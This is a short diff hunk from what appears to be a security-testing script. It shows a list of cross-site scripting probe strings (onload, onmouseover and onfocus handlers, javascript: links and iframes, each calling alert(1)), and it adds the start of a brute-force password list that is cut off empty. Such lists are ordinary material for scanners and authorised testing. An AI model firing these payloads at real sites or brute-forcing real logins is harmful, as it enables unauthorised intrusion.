@@ -20,3 +20,4 @@ xss_payloads = [
         '<body onload=alert(1)>', '<iframe src=javascript:alert(1)>', '<a href=javascript:alert(1)>Click</a>',
         '<div onmouseover=alert(1)>XSS</div>', '<input onfocus=alert(1)>'
 ]
+bruteforce_passwords = [
